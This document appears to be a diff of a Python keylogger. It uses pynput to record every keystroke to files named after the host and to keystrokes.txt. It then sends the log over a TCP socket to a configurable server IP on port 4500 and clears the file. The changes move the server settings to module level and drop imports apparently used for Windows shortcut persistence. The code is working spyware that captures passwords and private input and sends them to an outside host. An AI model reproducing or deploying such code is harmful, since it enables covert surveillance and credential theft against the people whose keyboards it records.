@@ -1,15 +1,18 @@
 import threading
 from pynput import keyboard
-import subprocess
 import os
 import socket
-import platform
 import time
-import winshell
-from win32com.client import Dispatch
 
+# Setup thongs
 ENCODING = 'utf-8'
 pressed_keys = set()
+
+server_ip = ''
+server_port = 4500
+
+hostname = socket.gethostname()
+file_name = f"{hostname}_last_key.txt"
 
 # Create keystrokes.txt or nothing if already exists
 def create_keystrokes_file():
@@ -22,9 +25,7 @@ def create_keystrokes_file():
 
 # The logic behind logging the keys
 def keylogger_callback(key):
-    """
-    Processes key press events.
-    """
+    
     global pressed_keys
     
     if hasattr(key, 'char') and key.char is not None:  # Check for valid character
@@ -46,19 +47,20 @@ def keylogger_callback(key):
     # Record the key press
     pressed_keys.add(name)
     
-    # Write keystroke to the file named after the hostname
-    hostname = socket.gethostname()
-    file_name = f"{hostname}_last_key.txt"
+    # Write keystroke to keystrokes.txt and the file named after the host
     with open(file_name, 'a', encoding=ENCODING) as last_key_file:
         last_key_file.write(str(name) + '\n')
+    with open("keystrokes.txt", 'a', encoding=ENCODING) as last_key_file:
+        last_key_file.write(str(name) + '\n')
 
-    # Check if keystrokes.txt exceeds 1000 characters
-    with open(file_name, 'r', encoding=ENCODING) as keystrokes_file:
+    # Check if keystrokes.txt exceeds 10 characters
+    with open("keystrokes.txt", 'r', encoding=ENCODING) as keystrokes_file:
         content = keystrokes_file.read()
         if len(content) >= 10000:
-            content = content[5:]
-            with open(file_name, 'w', encoding=ENCODING) as keystrokes_file:
+            content = content[4:]
+            with open("keystrokes.txt", 'w', encoding=ENCODING) as keystrokes_file:
                 keystrokes_file.write(content)
+            
 
 # Handles key release
 def on_release(key):
@@ -81,8 +83,6 @@ def send_last_key():
         
         # Check if the file exists
         if os.path.exists(file_name):
-            server_ip = 'YOUT IP HERE'
-            server_port = 4500
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                 try:
                     client_socket.connect((server_ip, server_port))
@@ -100,7 +100,7 @@ def send_last_key():
 
                     print("File sent successfully.")
                 except Exception as e:
-                    print(f"Error: {e}") # Oops :(
+                    print(f"Error: {e}") 
 
             # Clear the contents for new keylogs
             open(file_name, 'w').close()
